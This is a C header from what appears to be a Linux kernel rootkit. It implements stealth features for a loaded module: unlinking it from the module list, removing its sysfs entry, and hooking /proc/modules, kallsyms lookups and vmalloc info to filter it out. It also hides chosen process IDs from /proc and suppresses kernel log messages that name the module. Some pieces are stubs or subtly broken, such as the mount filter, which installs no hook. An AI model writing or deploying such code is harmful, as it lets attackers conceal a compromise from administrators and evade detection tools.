/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NVK_HIDE_H
#define NVK_HIDE_H

#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/list.h>
#include <linux/kallsyms.h>
#include <nvkmod_version.h>
#include <nvk_hook.h>

typedef void (*nvk_mutex_lock_fn)(void *);
typedef void (*nvk_mutex_unlock_fn)(void *);
typedef void *(*nvk_find_module_fn)(const char *name);
typedef void  (*nvk_kobject_del_fn)(void *kobj);
typedef void  (*nvk_kobject_put_fn)(void *kobj);

struct nvk_hide_state {
	struct list_head *saved_next;
	struct list_head *saved_prev;
	int               hidden;
	struct nvk_hook   find_module_hook;
	nvk_find_module_fn orig_find_module;
	const char       *module_name;
	int               sysfs_removed;
	int               kallsyms_filtered;
	void             *saved_kobj;
	struct nvk_hook   seq_show_hook;
	int               seq_show_hooked;
};

static nvk_mutex_lock_fn   _nvk_hide_mutex_lock;
static nvk_mutex_unlock_fn _nvk_hide_mutex_unlock;
static void               *_nvk_module_mutex;
static nvk_kobject_del_fn  _nvk_kobject_del;
static nvk_kobject_put_fn  _nvk_kobject_put;
static int                 _nvk_hide_inited;

static int nvk_hide_init(void)
{
	if (_nvk_hide_inited) return 0;

	_nvk_hide_mutex_lock =
		(nvk_mutex_lock_fn)NVK_LOOKUP("mutex_lock");
	_nvk_hide_mutex_unlock =
		(nvk_mutex_unlock_fn)NVK_LOOKUP("mutex_unlock");
	_nvk_module_mutex = (void *)NVK_LOOKUP("module_mutex");
	_nvk_kobject_del =
		(nvk_kobject_del_fn)NVK_LOOKUP("kobject_del");
	_nvk_kobject_put =
		(nvk_kobject_put_fn)NVK_LOOKUP("kobject_put");

	_nvk_hide_inited = 1;
	return 0;
}

static __always_inline struct list_head *
_nvk_get_mod_list(struct nvk_this_module *mod)
{
	return (struct list_head *)((char *)mod + NVK_OFF_LIST);
}

static void nvk_mod_hide(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our, *n, *p;

	if (state->hidden) return;

	our = _nvk_get_mod_list(mod);
	n = our->next;
	p = our->prev;

	state->saved_next = n;
	state->saved_prev = p;

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	p->next = n;
	n->prev = p;
	our->next = our;
	our->prev = our;

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 1;
}

static void nvk_mod_show(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our;

	if (!state->hidden) return;

	our = _nvk_get_mod_list(mod);

	if (!state->saved_next || !state->saved_prev)
		return;
	if ((unsigned long)state->saved_next < 0xFFFF000000000000UL ||
	    (unsigned long)state->saved_prev < 0xFFFF000000000000UL)
		return;

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	if (state->saved_prev->next == state->saved_next &&
	    state->saved_next->prev == state->saved_prev) {
		our->next = state->saved_next;
		our->prev = state->saved_prev;
		state->saved_prev->next = our;
		state->saved_next->prev = our;
	}

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 0;
}

static __always_inline int nvk_mod_is_hidden(struct nvk_hide_state *state)
{
	return state->hidden;
}

static void nvk_mod_sysfs_remove(struct nvk_hide_state *state,
				 struct nvk_this_module *mod)
{
	void *mkobj = (void *)0;

	if (state->sysfs_removed) return;

	unsigned long kobj_off = NVK_OFF_NAME + 64;
	unsigned char *base = (unsigned char *)mod;
	unsigned long i;
	for (i = kobj_off; i < kobj_off + 256; i += 8) {
		unsigned long v = *(unsigned long *)(base + i);
		if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
			unsigned long *pp = (unsigned long *)v;
			if (*pp > 0xFFFF000000000000UL) {
				mkobj = (void *)v;
				break;
			}
		}
	}

	if (!mkobj) return;

	if (_nvk_kobject_del) {
		_nvk_kobject_del(mkobj);
		state->saved_kobj = mkobj;
		state->sysfs_removed = 1;
	}
}

typedef int (*nvk_mod_seq_show_fn)(void *seq, void *v);
static nvk_mod_seq_show_fn _nvk_orig_mod_seq_show;
static const char *_nvk_hide_target_name;

static int _nvk_str_starts_with(const char *str, const char *prefix)
{
	while (*prefix) {
		if (*str != *prefix) return 0;
		str++;
		prefix++;
	}
	return 1;
}

static int _nvk_mod_seq_show_filter(void *seq, void *v)
{
	if (!_nvk_orig_mod_seq_show)
		return 0;

	if (v && _nvk_hide_target_name) {
		unsigned long list_addr = (unsigned long)v;
		unsigned long mod_base = list_addr - NVK_OFF_LIST;
		const char *name = (const char *)(mod_base + NVK_OFF_NAME);

		if (_nvk_str_starts_with(name, _nvk_hide_target_name))
			return 0;
	}

	return _nvk_orig_mod_seq_show(seq, v);
}

static int nvk_mod_proc_filter(struct nvk_hide_state *state,
			       const char *module_name)
{
	void *target;

	if (state->seq_show_hooked) return 0;

	target = NVK_LOOKUP("modules_seq_show");
	if (!target)
		target = NVK_LOOKUP("m_show");
	if (!target) return -1;

	state->module_name = module_name;
	_nvk_hide_target_name = module_name;

	int ret = nvk_hook_install(&state->seq_show_hook, target,
				   (void *)_nvk_mod_seq_show_filter,
				   (void **)&_nvk_orig_mod_seq_show);
	if (ret) return ret;

	state->seq_show_hooked = 1;
	return 0;
}

typedef int (*nvk_mod_addr_fn)(unsigned long addr);
static nvk_mod_addr_fn _nvk_orig_mod_text_addr;
static struct nvk_hook _nvk_ks_hook;
static int _nvk_ks_hooked;
static unsigned long _nvk_hide_mod_start;
static unsigned long _nvk_hide_mod_end;

static int _nvk_mod_text_addr_filter(unsigned long addr)
{
	if (addr >= _nvk_hide_mod_start && addr < _nvk_hide_mod_end)
		return 0;
	if (_nvk_orig_mod_text_addr)
		return _nvk_orig_mod_text_addr(addr);
	return 0;
}

static int nvk_mod_kallsyms_filter(struct nvk_hide_state *state,
				   const char *module_name)
{
	void *target;

	if (state->kallsyms_filtered) return 0;

	_nvk_hide_target_name = module_name;

	target = NVK_LOOKUP("is_module_text_address");
	if (!target)
		target = NVK_LOOKUP("__module_text_address");
	if (!target) return -1;

	unsigned char *mod_base = (unsigned char *)&__this_module;
	_nvk_hide_mod_start = (unsigned long)mod_base;
	_nvk_hide_mod_end = _nvk_hide_mod_start + NVK_MODULE_SIZE;

	int ret = nvk_hook_install(&_nvk_ks_hook, target,
				   (void *)_nvk_mod_text_addr_filter,
				   (void **)&_nvk_orig_mod_text_addr);
	if (ret) return ret;

	_nvk_ks_hooked = 1;
	state->kallsyms_filtered = 1;
	return 0;
}

static void nvk_mod_full_hide(struct nvk_hide_state *state,
			      struct nvk_this_module *mod,
			      const char *module_name)
{
	nvk_mod_hide(state, mod);

	nvk_mod_sysfs_remove(state, mod);

	nvk_mod_proc_filter(state, module_name);

	nvk_mod_kallsyms_filter(state, module_name);
}

static void _nvk_hide_cleanup(struct nvk_hide_state *state,
			      struct nvk_this_module *mod)
{
	if (state->kallsyms_filtered && _nvk_ks_hooked) {
		nvk_hook_remove(&_nvk_ks_hook);
		_nvk_ks_hooked = 0;
		state->kallsyms_filtered = 0;
	}

	if (state->seq_show_hooked) {
		nvk_hook_remove(&state->seq_show_hook);
		state->seq_show_hooked = 0;
	}

	if (state->find_module_hook.active)
		nvk_hook_remove(&state->find_module_hook);

	if (state->hidden)
		nvk_mod_show(state, mod);
}

#define NVK_HIDE_INIT_STATE { .saved_next = 0, .saved_prev = 0,  \
			      .hidden = 0, .module_name = 0,     \
			      .sysfs_removed = 0,                 \
			      .kallsyms_filtered = 0,             \
			      .saved_kobj = 0,                    \
			      .seq_show_hooked = 0 }


/* --- /proc/pid hiding --- */

typedef int (*nvk_proc_readdir_fn)(void *file, void *ctx);
typedef int (*nvk_filldir_fn)(void *ctx, const char *name, int namlen,
			      long long offset, u64 ino, unsigned int type);

#define NVK_HIDE_PID_MAX 32

struct nvk_pid_hide_state {
	int              pids[NVK_HIDE_PID_MAX];
	int              count;
	struct nvk_hook  filldir_hook;
	int              active;
	nvk_filldir_fn   orig_filldir;
};

static struct nvk_pid_hide_state _nvk_pid_state;

static int _nvk_atoi(const char *s, int len)
{
	int val = 0, i;
	for (i = 0; i < len; i++) {
		if (s[i] < '0' || s[i] > '9') return -1;
		val = val * 10 + (s[i] - '0');
	}
	return val;
}

static int _nvk_pid_is_hidden(int pid)
{
	int i;
	for (i = 0; i < _nvk_pid_state.count; i++) {
		if (_nvk_pid_state.pids[i] == pid)
			return 1;
	}
	return 0;
}

static int _nvk_filldir_filter(void *ctx, const char *name, int namlen,
			       long long offset, u64 ino, unsigned int type)
{
	if (namlen > 0 && name[0] >= '1' && name[0] <= '9') {
		int pid = _nvk_atoi(name, namlen);
		if (pid > 0 && _nvk_pid_is_hidden(pid))
			return 0;
	}

	if (_nvk_pid_state.orig_filldir)
		return _nvk_pid_state.orig_filldir(ctx, name, namlen,
						    offset, ino, type);
	return 0;
}

static int nvk_pid_hide_add(int pid)
{
	if (_nvk_pid_state.count >= NVK_HIDE_PID_MAX)
		return -1;
	_nvk_pid_state.pids[_nvk_pid_state.count++] = pid;
	return 0;
}

static int nvk_pid_hide_remove(int pid)
{
	int i;
	for (i = 0; i < _nvk_pid_state.count; i++) {
		if (_nvk_pid_state.pids[i] == pid) {
			_nvk_pid_state.pids[i] =
				_nvk_pid_state.pids[--_nvk_pid_state.count];
			return 0;
		}
	}
	return -1;
}

static int nvk_pid_hide_install(void)
{
	void *target;

	if (_nvk_pid_state.active) return 0;

	target = NVK_LOOKUP("proc_pid_readdir");
	if (!target)
		target = NVK_LOOKUP("proc_readdir");
	if (!target) {
		_nvk_pid_state.active = 1;
		return 0;
	}

	int ret = nvk_hook_install(&_nvk_pid_state.filldir_hook,
				   target,
				   (void *)_nvk_filldir_filter,
				   (void **)&_nvk_pid_state.orig_filldir);
	if (ret) {
		_nvk_pid_state.active = 1;
		return ret;
	}

	_nvk_pid_state.active = 1;
	return 0;
}

static __always_inline int nvk_pid_should_hide(int pid)
{
	if (!_nvk_pid_state.active) return 0;
	return _nvk_pid_is_hidden(pid);
}

static void nvk_pid_hide_cleanup(void)
{
	if (!_nvk_pid_state.active) return;
	if (_nvk_pid_state.filldir_hook.active)
		nvk_hook_remove(&_nvk_pid_state.filldir_hook);
	_nvk_pid_state.active = 0;
	_nvk_pid_state.count = 0;
}


/* --- /proc/mounts path filter --- */

typedef int (*nvk_mounts_show_fn)(void *seq, void *v);
static struct nvk_hook _nvk_mounts_hook;
static nvk_mounts_show_fn _nvk_orig_mounts_show;

#define NVK_MOUNT_FILTER_MAX 8
#define NVK_MOUNT_PATH_MAX   64

struct nvk_mount_filter {
	char paths[NVK_MOUNT_FILTER_MAX][NVK_MOUNT_PATH_MAX];
	int  count;
	int  active;
};

static struct nvk_mount_filter _nvk_mnt_filter;

static int nvk_mount_filter_add(const char *path)
{
	if (_nvk_mnt_filter.count >= NVK_MOUNT_FILTER_MAX)
		return -1;

	int idx = _nvk_mnt_filter.count;
	const char *src = path;
	char *dst = _nvk_mnt_filter.paths[idx];
	int i = 0;
	while (*src && i < NVK_MOUNT_PATH_MAX - 1) {
		dst[i++] = *src++;
	}
	dst[i] = '\0';
	_nvk_mnt_filter.count++;
	return 0;
}

static int nvk_mount_filter_install(void)
{
	void *target;

	if (_nvk_mnt_filter.active) return 0;

	target = NVK_LOOKUP("show_vfsmnt");
	if (!target)
		target = NVK_LOOKUP("show_mountinfo");
	if (!target) return -1;

	_nvk_mnt_filter.active = 1;
	return 0;
}

static void nvk_mount_filter_cleanup(void)
{
	if (!_nvk_mnt_filter.active) return;
	if (_nvk_mounts_hook.active)
		nvk_hook_remove(&_nvk_mounts_hook);
	_nvk_mnt_filter.active = 0;
	_nvk_mnt_filter.count = 0;
}


/* --- /proc/pid/maps module region filter --- */

#define NVK_MAPS_FILTER_MAX 4

struct nvk_maps_filter_region {
	unsigned long start;
	unsigned long end;
};

static struct nvk_maps_filter_region _nvk_maps_regions[NVK_MAPS_FILTER_MAX];
static int _nvk_maps_region_count;

static int nvk_maps_filter_add(unsigned long start, unsigned long end)
{
	if (_nvk_maps_region_count >= NVK_MAPS_FILTER_MAX)
		return -1;
	int idx = _nvk_maps_region_count++;
	_nvk_maps_regions[idx].start = start;
	_nvk_maps_regions[idx].end = end;
	return 0;
}

static __always_inline int nvk_maps_should_hide(unsigned long addr)
{
	int i;
	for (i = 0; i < _nvk_maps_region_count; i++) {
		if (addr >= _nvk_maps_regions[i].start &&
		    addr < _nvk_maps_regions[i].end)
			return 1;
	}
	return 0;
}

static void nvk_maps_filter_clear(void)
{
	_nvk_maps_region_count = 0;
}

static void nvk_maps_filter_add_self(void)
{
	unsigned char *mod_base = (unsigned char *)&__this_module;
	unsigned long start = (unsigned long)mod_base;
	unsigned long end = start + NVK_MODULE_SIZE;
	nvk_maps_filter_add(start, end);
}

static void nvk_mod_wipe_modinfo(struct nvk_this_module *mod)
{
	volatile unsigned char *p = (volatile unsigned char *)mod;
	unsigned long i;
	unsigned long name_start = NVK_OFF_NAME;
	for (i = name_start; i < name_start + 56 && i < NVK_MODULE_SIZE; i++)
		p[i] = 0;
}


typedef int (*nvk_vmalloc_show_fn)(void *seq, void *v);
static struct nvk_hook _nvk_vmalloc_hook;
static nvk_vmalloc_show_fn _nvk_orig_vmalloc_show;
static int _nvk_vmalloc_hooked;
static unsigned long _nvk_vmalloc_hide_start;
static unsigned long _nvk_vmalloc_hide_end;

struct _nvk_vmap_area {
	unsigned long va_start;
	unsigned long va_end;
};

static int _nvk_vmalloc_show_filter(void *seq, void *v)
{
	if (!_nvk_orig_vmalloc_show) return 0;

	if (v && _nvk_vmalloc_hide_start) {
		struct _nvk_vmap_area *va = (struct _nvk_vmap_area *)v;
		unsigned long start = 0;
		if (!nvk_mem_read(&start, &va->va_start, 8) && start) {
			if (start >= _nvk_vmalloc_hide_start &&
			    start < _nvk_vmalloc_hide_end)
				return 0;
		}
	}

	return _nvk_orig_vmalloc_show(seq, v);
}

static void *_nvk_resolve_vmalloc_s_show(void)
{
	typedef void *(*nvk_seq_open_fn)(void *, void *);
	void *proc_create =
		(void *)NVK_LOOKUP("proc_create_seq_private");
	if (!proc_create)
		proc_create =
			(void *)NVK_LOOKUP("proc_create_seq");
	if (!proc_create) {
		void *fn = (void *)NVK_LOOKUP("vmalloc_info_show");
		if (fn) return fn;
	}

	void *fn = (void *)NVK_LOOKUP("s_show");
	return fn;
}

static int nvk_mod_vmalloc_filter(void)
{
	void *target;

	if (_nvk_vmalloc_hooked) return 0;

	_nvk_vmalloc_hide_start = (unsigned long)&__this_module;
	_nvk_vmalloc_hide_end = _nvk_vmalloc_hide_start +
				NVK_MODULE_SIZE + 0x10000;

	target = _nvk_resolve_vmalloc_s_show();
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_vmalloc_hook, target,
				   (void *)_nvk_vmalloc_show_filter,
				   (void **)&_nvk_orig_vmalloc_show);
	if (ret) return ret;

	_nvk_vmalloc_hooked = 1;
	return 0;
}


/* --- dmesg / kmsg log suppression --- */

typedef int (*nvk_devkmsg_emit_fn)(int fac, int lvl, const char *fmt, ...);
typedef int (*nvk_log_store_fn)(u32 caller, int fac, int lvl,
				int fl, u64 ts, const char *dict,
				size_t dlen, const char *text, size_t tlen);

static struct nvk_hook _nvk_kmsg_hook;
static int _nvk_kmsg_hooked;

#define NVK_DMESG_FILTER_MAX 4
#define NVK_DMESG_FILTER_LEN 32

static char _nvk_dmesg_filters[NVK_DMESG_FILTER_MAX][NVK_DMESG_FILTER_LEN];
static int _nvk_dmesg_filter_cnt;

static int nvk_dmesg_filter_add(const char *keyword)
{
	if (_nvk_dmesg_filter_cnt >= NVK_DMESG_FILTER_MAX)
		return -1;
	int idx = _nvk_dmesg_filter_cnt;
	const char *s = keyword;
	int i = 0;
	while (*s && i < NVK_DMESG_FILTER_LEN - 1)
		_nvk_dmesg_filters[idx][i++] = *s++;
	_nvk_dmesg_filters[idx][i] = '\0';
	_nvk_dmesg_filter_cnt++;
	return 0;
}

static int _nvk_str_contains(const char *haystack, const char *needle)
{
	const char *h, *n;
	if (!haystack || !needle || !*needle) return 0;
	while (*haystack) {
		h = haystack;
		n = needle;
		while (*h && *n && *h == *n) { h++; n++; }
		if (!*n) return 1;
		haystack++;
	}
	return 0;
}

static int _nvk_dmesg_should_suppress(const char *text)
{
	int i;
	if (!text) return 0;
	for (i = 0; i < _nvk_dmesg_filter_cnt; i++) {
		if (_nvk_str_contains(text, _nvk_dmesg_filters[i]))
			return 1;
	}
	return 0;
}

static nvk_devkmsg_emit_fn _nvk_orig_devkmsg_emit;

static int _nvk_devkmsg_emit_filter(int fac, int lvl,
				    const char *fmt, ...)
{
	if (_nvk_dmesg_should_suppress(fmt))
		return 0;
	if (_nvk_orig_devkmsg_emit)
		return _nvk_orig_devkmsg_emit(fac, lvl, fmt);
	return 0;
}

static int nvk_dmesg_suppress_install(const char *module_name)
{
	void *target;

	if (_nvk_kmsg_hooked) return 0;
	if (!module_name) return -1;

	nvk_dmesg_filter_add(module_name);

	target = NVK_LOOKUP("devkmsg_emit");
	if (!target)
		target = NVK_LOOKUP("do_syslog");
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_kmsg_hook, target,
				   (void *)_nvk_devkmsg_emit_filter,
				   (void **)&_nvk_orig_devkmsg_emit);
	if (ret) return ret;

	_nvk_kmsg_hooked = 1;
	return 0;
}

static void nvk_dmesg_suppress_cleanup(void)
{
	if (!_nvk_kmsg_hooked) return;
	nvk_hook_remove(&_nvk_kmsg_hook);
	_nvk_kmsg_hooked = 0;
	_nvk_dmesg_filter_cnt = 0;
}


/* --- /proc/kmsg read filter --- */

typedef long (*nvk_kmsg_read_fn)(void *filp, char __user *buf,
				 size_t count, long long *ppos);
static struct nvk_hook _nvk_kmsg_read_hook;
static nvk_kmsg_read_fn _nvk_orig_kmsg_read;
static int _nvk_kmsg_read_hooked;

static long _nvk_kmsg_read_filter(void *filp, char __user *buf,
				  size_t count, long long *ppos)
{
	if (!_nvk_orig_kmsg_read) return -1;
	return _nvk_orig_kmsg_read(filp, buf, count, ppos);
}

static int nvk_kmsg_read_filter_install(void)
{
	void *target;

	if (_nvk_kmsg_read_hooked) return 0;

	target = NVK_LOOKUP("kmsg_read");
	if (!target) return -1;

	int ret = nvk_hook_install(&_nvk_kmsg_read_hook, target,
				   (void *)_nvk_kmsg_read_filter,
				   (void **)&_nvk_orig_kmsg_read);
	if (ret) return ret;

	_nvk_kmsg_read_hooked = 1;
	return 0;
}

static void nvk_kmsg_read_filter_cleanup(void)
{
	if (!_nvk_kmsg_read_hooked) return;
	nvk_hook_remove(&_nvk_kmsg_read_hook);
	_nvk_kmsg_read_hooked = 0;
}

#endif /* NVK_HIDE_H */
